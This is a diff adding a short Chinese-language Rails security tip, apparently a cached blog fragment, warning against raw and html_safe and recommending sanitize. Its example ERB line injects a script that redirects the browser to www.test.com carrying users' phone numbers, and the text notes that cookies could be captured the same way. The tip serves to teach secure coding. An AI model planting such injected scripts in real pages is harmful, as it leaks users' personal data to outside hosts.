@@ -1,0 +1,13 @@
+I"�<p>避免使用<code class="highlighter-rouge">raw</code>和<code class="highlighter-rouge">html_safe</code>, 安全使用<code class="highlighter-rouge">sanitize</code></p>
+<ul>
+  <li>
+    <h3 id="raw">raw</h3>
+    <p>例如：</p>
+  </li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="o">&lt;</span><span class="sx">%= raw "&lt;script type=</span><span class="p">\</span><span class="s2">"text/javascript</span><span class="se">\"</span><span class="s2">&gt;window.location.href='http://www.test.com?a=</span><span class="si">#{</span><span class="no">User</span><span class="p">.</span><span class="nf">limit</span><span class="p">(</span><span class="mi">10</span><span class="p">).</span><span class="nf">map</span><span class="p">(</span><span class="o">&amp;</span><span class="ss">:phone</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="s1">','</span><span class="p">)</span><span class="si">}</span><span class="s2">';&lt;/script&gt;"</span> <span class="o">%&gt;</span></code></pre></figure>
+
+<p>结果：
+执行 <code class="highlighter-rouge">script</code>中的内容，并且查询<code class="highlighter-rouge">User</code>数据发送给<code class="highlighter-rouge">www.test.com</code>,如果<code class="highlighter-rouge">www.test.com</code>是自己的服务器，我们可以在服务器中截取<code class="highlighter-rouge">User</code>用户数据，比如<code class="highlighter-rouge">cookie</code></p>
+:ET
